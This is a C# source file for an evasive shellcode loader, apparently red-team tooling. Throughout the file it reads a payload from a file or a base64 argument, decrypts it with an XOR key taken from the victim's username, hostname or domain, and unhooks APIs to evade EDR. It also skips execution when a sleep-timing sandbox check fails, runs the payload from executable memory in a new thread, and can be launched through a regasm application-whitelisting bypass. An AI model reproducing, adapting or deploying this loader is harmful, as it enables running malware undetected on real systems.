using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using DI = XYZ.DI;
using System.EnterpriseServices;

namespace ShellcodeLoader
{
    public class RegLoader : ServicedComponent
    {
        public RegLoader() { Console.WriteLine("I am a basic COM Object"); }

        [ComUnregisterFunction]
        public static void UnRegisterClass(string key)
        {
            Console.WriteLine("RegAsm mode engaged");
            List<string> args = new List<string>();
            string[] original_args = Environment.GetCommandLineArgs().Select(e => e.TrimStart('+')).ToArray();
            foreach (string arg in original_args)
            {
                if (arg == "--")
                {
                    Program.parseShellcodeArgs(original_args);
                    break;
                }
                switch (arg.Split('=')[0]) {
                    case "--no-unhook":
                        args.Add(arg.Split('=')[0]);
                        break;
                    case "--file":
                        args.Add(arg.Split('=')[1]);
                        break;
                    case "--base64":
                        args.Add("--base64");
                        args.Add(arg.Split('=')[1]);
                        break;
                    default:
                        break;
                }
            }

            Program.Main(args.ToArray());
        }
    }

    public class Program
    {
        private static bool unhook = true;
        internal static List<string> shellcode_args = new List<string>();
        private class Delegates
        {
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            internal delegate IntPtr WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            internal delegate IntPtr Sleep(uint dwMilliseconds);
        }
        private static byte[] StringToByteArray(string hex)
        {
            byte[] outr = new byte[(hex.Length / 2) + 1];
            for (int i = 0; i < hex.Length; i += 2)
            {
                outr[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            }
            return outr;
        }

        private unsafe static void writeHexPayloadToMem(string hex, ref IntPtr addr)
        {
            byte* ptr = (byte*)addr;
            for (int i = 0; i < hex.Length; i += 2)
            {
                ptr[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            }
        }

        private unsafe static bool checkString(byte* addr, byte[] str)
        {
            for (int i = 0; i<str.Length; i++)
            {
                if (str[i] != addr[i])
                {
                    return false;
                }
            }
            return true;
        }

        private unsafe static bool patchCliArgs(ref IntPtr addr, uint size, string[] args)
        {
            byte* ptr = (byte*)addr;
            byte[] placeholder = Encoding.ASCII.GetBytes("PARAMS_PLACEHOLDER");

            // Find the placeholder inside the shellcode
            int offset = -1;
            for (int i = 0; i < size; i++)
            {
                if (checkString(ptr+i, placeholder))
                {
                    offset = i;
                    break;
                }
            }
            
            if (offset == -1)
            {
                Console.Error.WriteLine("Warning: CLI Args placeholder not found. Runtime args will not work.");
                return false;
            }

            // Patch the placeholder with the real args
            byte[] args_str = Encoding.ASCII.GetBytes(string.Join(" ", args));
            for (int i = 0; i < args_str.Length; i++)
            {
                ptr[offset + i] = args_str[i];
            }

            // Zero-out the rest for 256 bytes (donut constant)
            for (int i = args_str.Length; i < 256; i++)
            {
                ptr[offset + i] = 0;
            }
            return true;
        }

        private unsafe static void writeBinPayloadToMem(byte[] payload, ref IntPtr addr)
        {
            byte* ptr = (byte*)addr;
            for (int i = 0; i < payload.Length; i++)
            {
                ptr[i] = payload[i];
            }
        }

        private unsafe static void decryptKeying(ref IntPtr addr, string key, UInt32 size)
        {
            byte[] keybytes = Encoding.ASCII.GetBytes(key);
            byte* ptr = (byte*)addr;
            for (int i = 0; i < size; i++)
            {
                ptr[i] = (byte)(ptr[i] ^ keybytes[i % keybytes.Length]);
            }
        }

        private enum KeyingMode
        {
            KEYING_NONE = 0,
            KEYING_PASSWORD = 1,
            KEYING_USERNAME = 2,
            KEYING_HOSTNAME = 3,
            KEYING_DOMAIN = 4
        }

        private static bool IsLOLZFormat(byte[] content)
        {
            byte[] magic = Encoding.ASCII.GetBytes("LOLZ");
            if (content.Length < magic.Length) return false;
            for (int i = 0; i < magic.Length; i++)
            {
                if (content[i] != magic[i]) return false;
            }
            return true;
        }

        private static string[] LoadLOLZFile(byte[] content)
        {
            try
            {
                string[] lines = System.Text.Encoding.UTF8.GetString(content).Replace("\r\n", "\n").Split('\n').Where(x => !string.IsNullOrEmpty(x)).ToArray();
                if (lines.Length != 2)
                {
                    Console.Error.WriteLine("Cannot parse shellcode file, wrong number of lines = " + lines.Length.ToString());
                    return null;
                }
                return new string[] { lines[0].Substring(4), lines[1] };
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("Cannot parse shellcode file.");
                Console.Error.WriteLine(e.Message);
            }
            return null;
        }

        private static string GetKey(string mode, string password = null)
        {
            StringBuilder keybuilder = new StringBuilder();
            foreach (char c in mode)
            {
                KeyingMode m = (KeyingMode)int.Parse(c.ToString());
                switch (m)
                {
                    case KeyingMode.KEYING_NONE:
                        return null;
                    case KeyingMode.KEYING_USERNAME:
                        keybuilder.Append(Environment.UserName);
                        break;
                    case KeyingMode.KEYING_HOSTNAME:
                        keybuilder.Append(Environment.MachineName);
                        break;
                    case KeyingMode.KEYING_DOMAIN:
                        keybuilder.Append(Environment.UserDomainName);
                        break;
                    case KeyingMode.KEYING_PASSWORD:
                        if (password != null)
                        {
                            keybuilder.Append(password);
                        }
                        else
                        {
                            //Console.Write("Password: ");
                            //keybuilder.Append(Console.ReadLine().Trim(new[] { '\n', '\r', ' ', '\t' }));
                            Console.Error.WriteLine("Password functionality unsupported at this time.");
                        }
                        break;
                }
            }
            return keybuilder.ToString();
        }

        private static void usage()
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("Usage: ShellcodeLoader.exe [--no-unhook] [-p password] [shellcode_file|--base64 base64_shellcode] [-- shellcode_param1 [shellcode_param2...]]");
            sb.AppendLine("\tshellcode_file\tfile containing the shellcode");
            sb.AppendLine("\\base64_shellcode\tshellcode in base64 format");
            sb.AppendLine("\\--\tEverything after \"--\" is passed to the shellcode as CLI arguments.");
            sb.AppendLine("If <shellcode_file> is not specified, the program will search for \"shellcode.bin\" the current working directory and then in C:\\Users\\Public.");
            sb.AppendLine("\t-p password\t[TEMPORARILY DISABLED] if a password is required for the key, it will be read from this parameter instead of asking interactively");
            sb.AppendLine("\t--no-unhook\tDON'T UNHOOK API before loading the shellcode");
            sb.AppendLine("\t--base64\tThe positional argument is directly the shellcode in base64 format.");
            sb.AppendLine("\nREGASM Mode:");
            sb.AppendLine("Usage: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe /U ShellcodeLoader.exe [+--no-unhook] [+--file=shellcode_file|+--base64=base64_shellcode]  [+-- shellcode_param1 [shellcode_param2...]]");
            sb.AppendLine("NOTE: Due to regasm complaining about wrong parameters, EVERY argument starting with a '-' MUST be prefixed with a '+', this also applies to shellcode params.(the '+' will be automatically removed during paring).");
            Console.WriteLine(sb.ToString());
        }

        internal static void parseShellcodeArgs(string[] args)
        {
            bool add = false;
            foreach (string arg in args)
            {
                if (add)
                {
                    string new_arg = arg;
                    if (new_arg.Contains(' ') && !new_arg.Contains('"'))
                    {
                        new_arg = ('"' + new_arg + '"');
                        new_arg = new_arg.Replace(@"\""", @"\\""");  
                    }
                    Program.shellcode_args.Add(new_arg);
                } else if (arg == "--")
                {
                    add = true;
                }
            }
        }

        public static int Main(string[] args)
        {
            // PARAMS
            string filename_or_base64 = null;
            string password = null;
            bool isbase64 = false;

            for (int i = 0; i < args.Length; i++)
            {
                if (args[i] == "--")
                {
                    parseShellcodeArgs(args);
                    break;
                }
                switch (args[i])
                {
                    case "--no-unhook":
                        Program.unhook = false;
                        break;
                    case "--base64":
                        isbase64 = true;
                        break;
                    case "-p":
                        if (i + 1 >= args.Length)
                        {
                            usage();
                            return -1;
                        }
                        password = args[i + 1];
                        i++;
                        break;
                    default:
                        if (filename_or_base64 == null)
                        {
                            filename_or_base64 = args[i];
                        }
                        else
                        {
                            usage();
                            return -1;
                        }
                        break;
                }
            }

            if (isbase64)
            {
                if (filename_or_base64 == null)
                {
                    Console.Error.WriteLine("You have used the --base64 flag without specifying the base64 shellcode");
                    return -3;
                }
                return GoB64(filename_or_base64);
            }
            else
            {
                string filename = filename_or_base64;
                if (filename == null)
                {
                    if (File.Exists("shellcode.bin"))
                    {
                        filename = "shellcode.bin";
                    }
                    else if (File.Exists("C:\\Users\\Public\\shellcode.bin"))
                    {
                        filename = "C:\\Users\\Public\\shellcode.bin";
                    }
                    else
                    {
                        Console.Error.WriteLine("Please specify an input filename");
                        usage();
                        return 0;
                    }
                }
                if (!File.Exists(filename))
                {
                    Console.Error.WriteLine("Specified filename does not exist: " + filename);
                    return -1;
                }

                // Load shellcode from file
                byte[] rawcontent;
                try
                {
                    rawcontent = File.ReadAllBytes(filename);
                }
                catch (Exception e)
                {
                    Console.Error.WriteLine("Unreadable shellcode file.");
                    Console.Error.WriteLine(e.Message);
                    return -2;
                }
                return Go(rawcontent);
            }
        }
        public static int GoB64(string payload)
        {
            return Go(Convert.FromBase64String(payload));
        }

        public static int Go(byte[] rawcontent)
        {
            string key = null;
            string strpayload = null;
            bool LOLZFormat = IsLOLZFormat(rawcontent);
            UInt32 payloadSize;
            if (LOLZFormat)
            {
                Console.WriteLine("Detected smart shellcode file");
                string[] content = LoadLOLZFile(rawcontent);
                key = GetKey(content[0], null);
                strpayload = content[1];
                payloadSize = Convert.ToUInt32(strpayload.Length / 2);
            }
            else
            {
                Console.WriteLine("Detected standard file");
                payloadSize = Convert.ToUInt32(rawcontent.Length);
            }

            // Unhook
            if (Program.unhook) Unhooker.Unhook();

            // Detect EDR
            DateTime t1 = DateTime.Now;
            object[] parameters = { (uint)2000 };
            DI.Generic.DynamicAPIInvoke("kernel32.dll", "Sleep", typeof(Delegates.Sleep), ref parameters);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return 255;
            }


            // Encrypt: https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'UTF8','string':'GMT'%7D,'Standard',false)To_Hex('None',0)
            // Allocate memory
            if (key == null)
            {
                Console.WriteLine("Shellcode not keyed.");
            }
            else
            {
                Console.WriteLine("Generated XOR key: " + key);
            }
            Console.WriteLine("Allocating memory, payload length: " + payloadSize);

            IntPtr addr = IntPtr.Zero;
            IntPtr region_size = (IntPtr)payloadSize;
            DI.Native.NtAllocateVirtualMemory((IntPtr)(-1), ref addr, IntPtr.Zero, ref region_size, (uint)0x3000, (uint)0x40);

            if (addr == IntPtr.Zero)
            {
                Console.Error.WriteLine("Allocation failed :(");
                return 255;
            }
            else
            {
                Console.WriteLine("Allocation successful!");
            }

            // Write shellcode into memory
            if (LOLZFormat)
            {
                writeHexPayloadToMem(strpayload, ref addr);
                // Decrypt shellcode
                if (key != null)
                {
                    decryptKeying(ref addr, key, payloadSize);
                }
                Console.Write("Patching CLI arguments... ");
                if (patchCliArgs(ref addr, payloadSize, Program.shellcode_args.ToArray()))
                {
                    Console.WriteLine("OK");
                } else
                {
                    Console.WriteLine("not supported (placeholder not found)");
                }
            }
            else
            {
                writeBinPayloadToMem(rawcontent, ref addr);
            }

            // Launch
            Console.WriteLine("Starting thread.");
            IntPtr threadId = IntPtr.Zero;
            IntPtr hThread = DI.Win32.CreateRemoteThread(
                Process.GetCurrentProcess().Handle,
                IntPtr.Zero,
                0,
                addr,
                IntPtr.Zero,
                0,
                ref threadId
                );

            Console.WriteLine("Executing shellcode now!");
            Console.WriteLine();
            object[] wait_parameters = new object[]
            {
            hThread,
            0xFFFFFFFF
            };
            DI.Generic.DynamicAPIInvoke("kernel32.dll", "WaitForSingleObject", typeof(Delegates.WaitForSingleObject), ref wait_parameters);
            Console.WriteLine("DONE!");
            return 0;
        }
    }
}